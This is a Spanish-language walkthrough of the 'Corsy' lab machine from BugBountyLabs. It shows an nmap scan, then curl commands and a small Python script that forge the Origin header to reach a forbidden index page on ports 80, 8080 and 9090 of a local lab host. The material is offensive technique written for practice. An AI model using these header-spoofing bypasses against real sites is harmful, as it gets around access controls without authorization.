Máquina **Corsy** de la plataforma **[BugBountyLabs](https://bugbountylabs.com/)**.

Autores: El Pingüino de Mario & Curiosidades De Hackers

Dificultad: Avanzado



![Corsy](images/corsy/corsy.png)

# Reconocimiento

 Comenzamos con un escaneo de `nmap`:

```css
nmap -p- --open --min-rate 5000 -Pn -n -vvv -sSVC -oN escaneo.txt 172.17.0.2
```

```ruby
# Nmap 7.95 scan initiated Wed Jan 22 15:43:01 2025 as: nmap -p- --open --min-rate 5000 -Pn -n -vvv -sSVC -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000013s latency).
Scanned at 2025-01-22 15:43:02 -03 for 28s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.62
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://corsy.lab//
|_http-server-header: Apache/2.4.62 (Debian)
8080/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: 403 Forbidden
9090/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Hosts: corsy.lab, 172.17.0.2

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 22 15:43:30 2025 -- 1 IP address (1 host up) scanned in 28.32 seconds
```

en esta plataforma, el objetivo no es que entremos en la máquina, si no el lograr explotar las 3 vulnerabilidades que se encuentran en ella, la cual realmente es una: Cross-Origin Resource Sharing

Como dije anteriormente, tenemos la vulnerabilidad **Cross-Origin Resource Sharing** en 3 puertos diferentes, el objetivo sería lograr acceder al "index.html" el cual está bloqueado y nos sale 403.

# Puerto 80

Para lograr acceder al html, en este caso simplemente podemos hacerlo con `curl` poniendo el origen como "corsy.lab", ya que ese es el dominio que tenemos (el cual tenemos que agregar en el `/etc/hosts` de nuestra máquina atacante):

```css
curl http://corsy.lab -H "Origin: http://corsy.lab"
```

con simplemente enviar eso ya podremos ver el html y podemos pasar al próximo nivel/puerto.

# Puerto 8080

En este caso, si intentamos hacerlo con `curl` no nos deja, por lo que podemos intentar bypasearlo usando un script en python:

```python
import requests

url = "http://corsy.lab:8080"

headers = {
    "Origin": "http://corsy.lab",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Connection": "keep-alive"
}

response = requests.get(url, headers=headers)

print(f"Body:\n{response.text}")
```

Luego de ejecutarlo, podremos ver el html y podemos pasar al último nivel.

# Puerto 9090

En este caso, podemos hacerlo de distintas maneras, pero yo lo haré con `curl`, ya que en este caso, el cors parece estar configurado para que nos deje ver el html solo en caso de que el origen sea `http**s**://corsy.lab`, ya que si ponemos `http` nos saldrá "403 Forbidden":

```css
curl http://corsy.lab:9090 -H "Origin: https://corsy.lab"
```

al ejecutarlo, podremos ver el código html (la web) y habremos bypaseado todos los cors y finalizado la máquina.

Gracias por leer ;)